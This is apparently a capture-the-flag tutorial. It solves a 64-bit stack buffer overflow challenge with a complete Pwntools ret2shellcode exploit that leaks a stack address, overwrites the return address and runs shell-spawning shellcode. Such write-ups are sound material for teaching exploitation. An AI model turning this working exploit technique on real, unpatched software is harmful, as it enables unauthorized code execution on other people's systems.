To solve this Capture the Flag (CTF) binary exploitation challenge using Pwntools, we'll perform a classic ret2shellcode attack on a 64-bit ELF executable. Here's a step-by-step guide along with the corresponding code.

### **Challenge Analysis**

**1. Vulnerability Identification:**

- The program reads **0x400** bytes (1024 bytes) into a buffer that's only **16 bytes** long (`buf[2]` where each `__int64` is 8 bytes).
- This leads to a **buffer overflow**, allowing us to overwrite the **saved return address** on the stack.

**2. Executable Mitigations:**

Based on the `checksec` output:

- **NX (No eXecute)** is **disabled** (`"nx":"no"`), so the stack is executable.
- **PIE (Position Independent Executable)** is **disabled** (`"pie":"no"`), so addresses are predictable.
- **Canary** is **not present** (`"canary":"no"`), so no stack canary protection.

**3. Information Leakage:**

- The program prints the **stack address** of `buf`, which we'll use to calculate the exact location to place our shellcode.

### **Exploitation Strategy**

We will:

1. **Leak** the stack address of `buf`.
2. **Inject shellcode** into the stack.
3. **Overwrite** the return address to point to our shellcode.

### **Step-by-Step Solution**

#### **1. Set Up the Environment**

```python
from pwn import *

# Set the architecture context
context.binary = './rop'  # Name of the binary
context.arch = 'amd64'    # 64-bit architecture
context.log_level = 'debug'  # To see detailed logs (optional)
```

#### **2. Start the Process**

```python
p = process('./rop')
```

#### **3. Receive Initial Outputs and Extract `buf` Address**

```python
# Receive the welcome message
p.recvline()

# Receive the line containing the buf address
line = p.recvline()
# Extract the address using regex
import re
m = re.search(r'\[(0x[0-9a-fA-F]+)\]', line.decode())
buf_addr = int(m.group(1), 16)
log.info(f"Buffer address: {hex(buf_addr)}")

# Receive the prompt for input
p.recvline()
```

#### **4. Calculate the Offset to Return Address**

We need to find out how many bytes of padding are required to reach the return address.

Since `buf` is at `rbp-0x10` and the saved return address is `rbp+8`, the offset is:

```python
offset = 24  # 16 bytes for buf + 8 bytes for saved base pointer
```

#### **5. Generate the Shellcode**

We'll use Pwntools' `shellcraft` module to generate shellcode that spawns a shell.

```python
shellcode = asm(shellcraft.sh())
log.info(f"Shellcode length: {len(shellcode)} bytes")
```

#### **6. Build the Payload**

We'll construct the payload in the following order:

- **Padding**: To fill up to the return address.
- **Return Address Overwrite**: Overwrite the return address with the address pointing to our shellcode.
- **Shellcode**: The actual code to execute.

```python
# The address where our shellcode starts
shellcode_address = buf_addr + offset

# Construct the payload
payload = b'A' * offset                      # Padding to reach the return address
payload += p64(shellcode_address)            # Overwrite return address with shellcode address
payload += shellcode                         # Append the shellcode
```

#### **7. Send the Payload**

```python
# Send the payload to the program
p.sendline(payload)
```

#### **8. Interact with the Shell**

```python
# Switch to interactive mode to use the shell
p.interactive()
```

### **Full Exploit Script**

Putting it all together:

```python
from pwn import *
import re

# Set the architecture context
context.binary = './rop'
context.arch = 'amd64'
context.log_level = 'debug'

# Start the process
p = process('./rop')

# Receive the welcome message
p.recvline()

# Receive the line containing the buf address
line = p.recvline()
# Extract the address using regex
m = re.search(r'\[(0x[0-9a-fA-F]+)\]', line.decode())
buf_addr = int(m.group(1), 16)
log.info(f"Buffer address: {hex(buf_addr)}")

# Receive the prompt for input
p.recvline()

# Calculate the offset to the return address
offset = 24  # 16 bytes for buf + 8 bytes for saved base pointer

# Generate the shellcode
shellcode = asm(shellcraft.sh())
log.info(f"Shellcode length: {len(shellcode)} bytes")

# The address where our shellcode starts
shellcode_address = buf_addr + offset

# Build the payload
payload = b'A' * offset                      # Padding to reach the return address
payload += p64(shellcode_address)            # Overwrite return address with shellcode address
payload += shellcode                         # Append the shellcode

# Send the payload
p.sendline(payload)

# Interact with the shell
p.interactive()
```

### **Explanation of the Exploit**

- **Buffer Overflow**: We overflow the buffer to overwrite the return address.
- **Return Address Overwrite**: We set the return address to the location of our shellcode on the stack.
- **Shellcode Execution**: Since NX is disabled, the shellcode on the stack is executable.
- **Gaining a Shell**: The shellcode spawns a shell (`/bin/sh`), giving us control.

### **Testing the Exploit**

- **Run the script**: Execute the Python script using `python3 exploit.py`.
- **Verify the Shell**: If the exploit is successful, you should see a shell prompt.
- **Try Commands**: Execute commands like `whoami`, `ls`, etc., to confirm shell access.

### **Notes**

- **ASLR Considerations**: Since PIE is disabled and the stack address is leaked, ASLR should not hinder the exploit.
- **Environment**: Ensure that the exploit is run in the same environment as the challenge (e.g., local machine or provided VM) to avoid discrepancies.
- **Permissions**: If you encounter permission issues, check that the binary has execute permissions (`chmod +x rop`).

### **Summary**

By leveraging the buffer overflow vulnerability and the lack of modern binary protections, we crafted an exploit that injects and executes shellcode on the stack, ultimately giving us a shell. This approach is a classic example of a **ret2shellcode** attack in binary exploitation challenges.
